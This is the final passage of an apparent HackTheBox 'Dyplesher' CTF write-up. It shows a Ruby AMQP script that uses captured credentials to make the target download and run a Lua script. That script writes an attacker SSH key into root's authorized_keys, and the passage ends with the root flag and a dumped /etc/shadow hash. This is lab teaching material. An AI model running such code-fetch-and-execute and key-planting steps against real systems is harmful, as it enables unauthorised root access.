</span></span></code></pre></td></tr></table></div></div><p>Anyway we got the AMQP credentials: <code>yuntao:EashAnicOc3Op</code>.</p><p>Let&rsquo;s add credentials to our AMQP PoC:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#!/usr/bin/env ruby</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;bunny&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>options</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=ss>host</span><span class=p>:</span> <span class=s1>&#39;10.10.10.190&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>port</span><span class=p>:</span> <span class=mi>5672</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>user</span><span class=p>:</span> <span class=s1>&#39;yuntao&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>password</span><span class=p>:</span> <span class=s1>&#39;EashAnicOc3Op&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>connection</span> <span class=o>=</span> <span class=no>Bunny</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>options</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>connection</span><span class=o>.</span><span class=n>start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>channel</span> <span class=o>=</span> <span class=n>connection</span><span class=o>.</span><span class=n>create_channel</span>
</span></span><span class=line><span class=cl><span class=n>exchange</span> <span class=o>=</span> <span class=n>channel</span><span class=o>.</span><span class=n>fanout</span><span class=p>(</span><span class=s1>&#39;logs&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>message</span> <span class=o>=</span> <span class=no>ARGV</span><span class=o>.</span><span class=n>empty?</span> <span class=p>?</span> <span class=s1>&#39;Hello World!&#39;</span> <span class=p>:</span> <span class=no>ARGV</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exchange</span><span class=o>.</span><span class=n>publish</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34; [x] Sent </span><span class=si>#{</span><span class=n>message</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>connection</span><span class=o>.</span><span class=n>close</span>
</span></span></code></pre></td></tr></table></div></div><p>Fine this is working now:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby amqp.rb
</span></span><span class=line><span class=cl> [x] Sent Hello World!
</span></span></code></pre></td></tr></table></div></div><p>Now we need to send our message into <code>plugin_data</code> queue and not <code>logs</code>; and
also to change the message to our downlaod URL.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#!/usr/bin/env ruby</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;bunny&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>options</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=ss>host</span><span class=p>:</span> <span class=s1>&#39;10.10.10.190&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>port</span><span class=p>:</span> <span class=mi>5672</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>user</span><span class=p>:</span> <span class=s1>&#39;yuntao&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>password</span><span class=p>:</span> <span class=s1>&#39;EashAnicOc3Op&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>connection</span> <span class=o>=</span> <span class=no>Bunny</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>options</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>connection</span><span class=o>.</span><span class=n>start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>channel</span> <span class=o>=</span> <span class=n>connection</span><span class=o>.</span><span class=n>create_channel</span>
</span></span><span class=line><span class=cl><span class=n>exchange</span> <span class=o>=</span> <span class=n>channel</span><span class=o>.</span><span class=n>fanout</span><span class=p>(</span><span class=s1>&#39;plugin_data&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>message</span> <span class=o>=</span> <span class=no>ARGV</span><span class=o>.</span><span class=n>empty?</span> <span class=p>?</span> <span class=s1>&#39;http://10.10.15.36:8000/cyfun.test&#39;</span> <span class=p>:</span> <span class=no>ARGV</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exchange</span><span class=o>.</span><span class=n>publish</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34; [x] Sent </span><span class=si>#{</span><span class=n>message</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>connection</span><span class=o>.</span><span class=n>close</span>
</span></span></code></pre></td></tr></table></div></div><p>But it an error tells us we are not using the right exchange type.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby amqp.rb
</span></span><span class=line><span class=cl>Traceback (most recent call last):
</span></span><span class=line><span class=cl>        6: from amqp.rb:15:in `&lt;main&gt;&#39;
</span></span><span class=line><span class=cl>        5: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:316:in `fanout&#39;
</span></span><span class=line><span class=cl>        4: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:316:in `new&#39;
</span></span><span class=line><span class=cl>        3: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/exchange.rb:87:in `initialize&#39;
</span></span><span class=line><span class=cl>        2: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/exchange.rb:254:in `declare!&#39;
</span></span><span class=line><span class=cl>        1: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:1194:in `exchange_declare&#39;
</span></span><span class=line><span class=cl>/home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:1992:in `raise_if_continuation_resulted_in_a_channel_error!&#39;: PRECONDITION_FAILED - inequivalent arg &#39;type&#39; for exchange &#39;plugin_data&#39; in vhost &#39;/&#39;: received &#39;fanout&#39; but current is &#39;direct&#39; (Bunny::PreconditionFailed)
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s change fanout into direct.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gd>-exchange = channel.fanout(&#39;plugin_data&#39;)
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+exchange = channel.direct(&#39;plugin_data&#39;)
</span></span></span></code></pre></td></tr></table></div></div><p>Thanks to the very verbose error we know we must have a durable queue.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby amqp.rb
</span></span><span class=line><span class=cl>Traceback (most recent call last):
</span></span><span class=line><span class=cl>        6: from amqp.rb:15:in `&lt;main&gt;&#39;
</span></span><span class=line><span class=cl>        5: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:334:in `direct&#39;
</span></span><span class=line><span class=cl>        4: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:334:in `new&#39;
</span></span><span class=line><span class=cl>        3: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/exchange.rb:87:in `initialize&#39;
</span></span><span class=line><span class=cl>        2: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/exchange.rb:254:in `declare!&#39;
</span></span><span class=line><span class=cl>        1: from /home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:1194:in `exchange_declare&#39;
</span></span><span class=line><span class=cl>/home/cyfun/.asdf/installs/ruby/2.7.1/lib/ruby/gems/2.7.0/gems/bunny-2.17.0/lib/bunny/channel.rb:1992:in `raise_if_continuation_resulted_in_a_channel_error!&#39;: PRECONDITION_FAILED - inequivalent arg &#39;durable&#39; for exchange &#39;plugin_data&#39; in vhost &#39;/&#39;: received &#39;false&#39; but current is &#39;true&#39; (Bunny::PreconditionFailed)
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s see how we can do that with <a href=https://rdoc.info/github/ruby-amqp/bunny/Bunny/Channel#direct-instance_method>bunny</a>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gd>-exchange = channel.direct(&#39;plugin_data&#39;)
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+exchange = channel.direct(&#39;plugin_data&#39;, durable: true)
</span></span></span></code></pre></td></tr></table></div></div><p>Yes! This time it worked.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby amqp.rb
</span></span><span class=line><span class=cl> [x] Sent http://10.10.15.36:8000/cyfun.test
</span></span></code></pre></td></tr></table></div></div><p>But our webserver was never pinged back:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby -run -ehttpd . -p8000
</span></span><span class=line><span class=cl>[2020-10-01 23:04:28] INFO  WEBrick 1.6.0
</span></span><span class=line><span class=cl>[2020-10-01 23:04:28] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
</span></span><span class=line><span class=cl>[2020-10-01 23:04:28] INFO  WEBrick::HTTPServer#start: pid=124909 port=8000
</span></span></code></pre></td></tr></table></div></div><p>I tried many different port but all is blocked, so let&rsquo;s serve something from
the machine directly, localhost must be allowed by the firewall.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>felamos@dyplesher:~$ python3 -m http.server
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby amqp.rb
</span></span><span class=line><span class=cl> [x] Sent http://127.0.0.1:8000/cyfun.test
</span></span></code></pre></td></tr></table></div></div><p>Yeah it worked:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>127.0.0.1 - - [01/Oct/2020 21:30:30] code 404, message File not found
</span></span><span class=line><span class=cl>127.0.0.1 - - [01/Oct/2020 21:30:30] &#34;GET /cyfun.test HTTP/1.0&#34; 404 -
</span></span></code></pre></td></tr></table></div></div><p>Now that our PoC is working, let&rsquo;s create a real payload.</p><p>The hint told us that the plugin would be downloaded and &ldquo;added&rdquo; (udnerstand executed).
It was talinkg about Cuberite plugin. <a href=https://cuberite.org/>Cuberite</a> is another Minecraft server,
this time plugins wont be coded in Java but <a href=https://api.cuberite.org/>in Lua</a>.</p><p>We could read how to <a href=https://api.cuberite.org/Writing-a-Cuberite-plugin.html>Writing a Cuberite plugin</a>
but in fact we don&rsquo;t even need a proper plugin, any lua script will be executed.</p><p>Let&rsquo;s GTFO to see how we can write our key to root SSH authorized keys file.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ gtfoblookup linux write lua
</span></span><span class=line><span class=cl>lua:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    file-write:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        Code: lua -e &#39;local f=io.open(&#34;file_to_write&#34;, &#34;wb&#34;);
</span></span><span class=line><span class=cl>              f:write(&#34;DATA&#34;); io.close(f);&#39;
</span></span></code></pre></td></tr></table></div></div><p>My short LUA script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-lua data-lang=lua><span class=line><span class=cl><span class=n>f</span><span class=o>=</span><span class=n>io.open</span><span class=p>(</span><span class=s2>&#34;/root/.ssh/authorized_keys&#34;</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>f</span><span class=p>:</span><span class=n>write</span><span class=p>(</span><span class=s2>&#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDC/yatK67NXLmgt1LepjDbW2b7lE6z7Y8aIlveOGb6Lp48w0X9qTYNtqe7tgXQCN0qbMlhARBekVewayh4XouStOoEz7jeT8v4vL6awy0XwrqA/asj/LNjDOjAVGBtOsnPn9qE4JXsxQLBGlxouETwrZSUh1FMQFSzO77FasFQO8k59XO9cgCYj/b+TjM+IV5S6uSZPlmchmeT3abJjBaE+JHZ3V9wpCcOZ8v/kMEL+2jW4Rc6R7ChuQeZmNbkZxOx+xiJIu/otpMwrLhApG8zQ3Gm2sCWa1Xg1PjzIga4TD11VHoPgaeqTPhML4Y+zx4WUv8zib3Fl3boYapqiHQy0BMM6knfnCCu+gpkurBtJOqr/4rnq2bL/akVWjjPs3SbKdluQiBp6L8ZJ9dLz2JTpV0TsEEelbnYXT0jY13iAU+iZTnAiJJL/suTFuk1jAvIO8sz1wc8oi0BXaITbaUpKQAnkREdR6rJItH/MO9R2GnPKPby9KshKcvn9eL+jBk= cyfun@penarch&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>io.close</span><span class=p>(</span><span class=n>f</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>My final AMQP PoC:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=ch>#!/usr/bin/env ruby</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>require</span> <span class=s1>&#39;bunny&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>options</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=ss>host</span><span class=p>:</span> <span class=s1>&#39;10.10.10.190&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>port</span><span class=p>:</span> <span class=mi>5672</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>user</span><span class=p>:</span> <span class=s1>&#39;yuntao&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=ss>password</span><span class=p>:</span> <span class=s1>&#39;EashAnicOc3Op&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>connection</span> <span class=o>=</span> <span class=no>Bunny</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>options</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>connection</span><span class=o>.</span><span class=n>start</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>channel</span> <span class=o>=</span> <span class=n>connection</span><span class=o>.</span><span class=n>create_channel</span>
</span></span><span class=line><span class=cl><span class=n>exchange</span> <span class=o>=</span> <span class=n>channel</span><span class=o>.</span><span class=n>direct</span><span class=p>(</span><span class=s1>&#39;plugin_data&#39;</span><span class=p>,</span> <span class=ss>durable</span><span class=p>:</span> <span class=kp>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>message</span> <span class=o>=</span> <span class=no>ARGV</span><span class=o>.</span><span class=n>empty?</span> <span class=p>?</span> <span class=s1>&#39;http://127.0.0.1:9999/cyfun.lua&#39;</span> <span class=p>:</span> <span class=no>ARGV</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39; &#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exchange</span><span class=o>.</span><span class=n>publish</span><span class=p>(</span><span class=n>message</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>puts</span> <span class=s2>&#34; [x] Sent </span><span class=si>#{</span><span class=n>message</span><span class=si>}</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>connection</span><span class=o>.</span><span class=n>close</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ruby amqp.rb
</span></span><span class=line><span class=cl> [x] Sent http://127.0.0.1:9999/cyfun.lua
</span></span></code></pre></td></tr></table></div></div><p>I win:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ssh -i ~/.ssh/id_rsa root@dyplesher.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dyplesher:~# cat root.txt
</span></span><span class=line><span class=cl>2f8166c0264af8f5e4a97cbd5587f820
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dyplesher:~# cat /etc/shadow | grep root
</span></span><span class=line><span class=cl>root:$6$xVQMTu91zGrMGCuW$qC.xh5Ss5WwuRJfr67qu8jQrFxBuXz7wCyZ.V2uG375veFICLiKXXc2O.ZOwpBvzZgbqRH3OvnkiFQPbpWJk8/:18375:0:99999:7::
</span></span></code></pre></td></tr></table></div></div><p>:
[JtR]:https://www.openwall.com/john/</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://s4ch.github.io/tags/ctf/>Ctf</a></li><li><a href=https://s4ch.github.io/tags/hackthebox/>Hackthebox</a></li><li><a href=https://s4ch.github.io/tags/penetration-testing/>Penetration-Testing</a></li><li><a href=https://s4ch.github.io/tags/writeup/>Writeup</a></li><li><a href=https://s4ch.github.io/tags/linux/>Linux</a></li><li><a href=https://s4ch.github.io/tags/insane/>Insane</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://s4ch.github.io/>CyFun</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script><script>document.querySelectorAll("pre > code").forEach(e=>{const n=e.parentNode.parentNode,t=document.createElement("button");t.classList.add("copy-code"),t.innerHTML="copy";function s(){t.innerHTML="copied!",setTimeout(()=>{t.innerHTML="copy"},2e3)}t.addEventListener("click",t=>{if("clipboard"in navigator){navigator.clipboard.writeText(e.textContent),s();return}const n=document.createRange();n.selectNodeContents(e);const o=window.getSelection();o.removeAllRanges(),o.addRange(n);try{document.execCommand("copy"),s()}catch{}o.removeRange(n)}),n.classList.contains("highlight")?n.appendChild(t):n.parentNode.firstChild==n||(e.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?e.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(t):e.parentNode.appendChild(t))})</script></body></html>